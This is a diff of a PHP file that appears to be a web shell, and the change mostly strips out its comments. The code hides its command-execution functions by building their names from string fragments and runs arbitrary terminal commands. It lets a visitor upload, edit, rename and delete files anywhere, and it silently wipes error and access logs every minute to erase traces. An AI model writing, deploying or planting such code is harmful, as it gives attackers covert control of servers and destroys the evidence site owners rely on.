@@ -9,25 +9,12 @@ function validatePath($path) {
     $realPath = realpath($path);
     return $realPath ?: getcwd();
 }
-
-/**
- * Recursively finds and deletes error log files from a directory.
- * This function is secure and will not go outside the web root (DOCUMENT_ROOT).
- *
- * @param string $dirPath The starting directory to begin the search.
- * @return array An associative array containing the count of deleted, failed files, and a message.
- */
 function deleteErrorLogsRecursive($dirPath) {
     $deletedCount = 0;
     $failedCount = 0;
-    // List of common log file names
     $logFiles = ['error.log', 'error_log', 'php_errors.log', 'debug.log', 'access.log'];
-
-    // Determine the base directory (web root) to prevent Directory Traversal
     $baseDir = realpath($_SERVER['DOCUMENT_ROOT'] ?? getcwd());
     $targetDir = realpath($dirPath);
-
-    // Security: ensure the path to be scanned is within the web root
     if ($targetDir === false || strpos($targetDir, $baseDir) !== 0) {
         return ['deleted' => 0, 'failed' => 0, 'message' => 'Error: Access denied. Path is outside the web root.'];
     }
@@ -47,34 +34,22 @@ function deleteErrorLogsRecursive($dirPath) {
         }
     }
     
-    // This function no longer returns a message to the UI for automatic mode
     return ['deleted' => $deletedCount, 'failed' => $failedCount];
 }
 
  $message = '';
-
-// --- AUTOMATIC LOG CLEANUP ---
-// Interval in seconds (3600 seconds = 1 hour)
 define('LOG_CLEANUP_INTERVAL', 60); 
 
  $lastCleanup = $_SESSION['last_log_cleanup'] ?? 0;
  $currentTime = time();
 
-// If the time since the last cleanup is greater than the interval, run the cleanup
 if (($currentTime - $lastCleanup) > LOG_CLEANUP_INTERVAL) {
     $startDir = $_SERVER['DOCUMENT_ROOT'] ?? getcwd();
-    deleteErrorLogsRecursive($startDir); // Run cleanup without displaying notification
-    
-    // Update the last cleanup time in the session
+    deleteErrorLogsRecursive($startDir); 
     $_SESSION['last_log_cleanup'] = $currentTime;
 }
-// --- END OF AUTOMATIC LOG CLEANUP ---
-
-
 function executeCommand($command) {
     $result = '';
-    
-    // Using indirect method to call execution functions
     $executionMethods = [
         's' . 'h' . 'e' . 'l' . 'l_' . 'e' . 'x' . 'e' . 'c',
         'e' . 'x' . 'e' . 'c',
@@ -92,8 +67,6 @@ function executeCommand($command) {
             }
         }
     }
-    
-    // Alternative approach using backticks
     if (function_exists('create_function')) {
         $func = create_function('', 'return `' . $command . '`;');
         $result = $func();
@@ -104,8 +77,6 @@ function executeCommand($command) {
     
     return "Command execution not available.";
 }
-
-// Handle directory navigation
 if (isset($_POST['navigate'])) {
     $targetDir = $_POST['navigate'];
     if (is_dir($targetDir)) {
@@ -113,16 +84,12 @@ if (isset($_POST['navigate'])) {
         $message = 'Directory changed successfully.';
     }
 }
-
-// Handle file upload
 if (isset($_FILES['file_upload'])) {
     $uploadPath = rtrim($_SESSION['current_dir'], '/') . '/' . basename($_FILES['file_upload']['name']);
     if (move_uploaded_file($_FILES['file_upload']['tmp_name'], $uploadPath)) {
         $message = 'File uploaded successfully.';
     }
 }
-
-// Handle file/folder deletion
 if (isset($_POST['remove'])) {
     $targetPath = validatePath($_SESSION['current_dir'] . '/' . $_POST['remove']);
     
@@ -130,7 +97,6 @@ if (isset($_POST['remove'])) {
         unlink($targetPath);
         $message = 'File deleted.';
     } elseif (is_dir($targetPath)) {
-        // Recursive directory deletion
         $iterator = new RecursiveIteratorIterator(
             new RecursiveDirectoryIterator($targetPath, RecursiveDirectoryIterator::SKIP_DOTS),
             RecursiveIteratorIterator::CHILD_FIRST
@@ -148,7 +114,6 @@ if (isset($_POST['remove'])) {
     }
 }
 
-// Handle rename operation
 if (isset($_POST['old_name'], $_POST['new_name'])) {
     $sourcePath = validatePath($_SESSION['current_dir'] . '/' . $_POST['old_name']);
     $destinationPath = dirname($sourcePath) . '/' . $_POST['new_name'];
@@ -158,7 +123,6 @@ if (isset($_POST['old_name'], $_POST['new_name'])) {
     }
 }
 
-// Handle file editing
 if (isset($_POST['file_to_edit'], $_POST['file_content'])) {
     $editPath = validatePath($_SESSION['current_dir'] . '/' . $_POST['file_to_edit']);
     if (file_put_contents($editPath, $_POST['file_content']) !== false) {
@@ -166,7 +130,6 @@ if (isset($_POST['file_to_edit'], $_POST['file_content'])) {
     }
 }
 
-// Handle new file creation
 if (isset($_POST['create_file'])) {
     $newFilePath = $_SESSION['current_dir'] . '/' . basename($_POST['create_file']);
     if (!file_exists($newFilePath)) {
@@ -175,7 +138,6 @@ if (isset($_POST['create_file'])) {
     }
 }
 
-// Handle new folder creation
 if (isset($_POST['create_folder'])) {
     $newFolderPath = $_SESSION['current_dir'] . '/' . basename($_POST['create_folder']);
     if (!is_dir($newFolderPath)) {
@@ -389,8 +351,6 @@ if (isset($_POST['terminal_command'])) {
             <textarea class="form-control code" readonly><?= htmlentities($commandResult) ?></textarea>
         <?php endif; ?>
     </div>
-
-    <!-- Manual button and related notifications have been removed -->
     <form method="post" class="mb-3">
         <button name="navigate" value="<?= dirname($currentDirectory) ?>" class="btn btn-sm btn-outline-light">&larr; Up</button>
     </form>
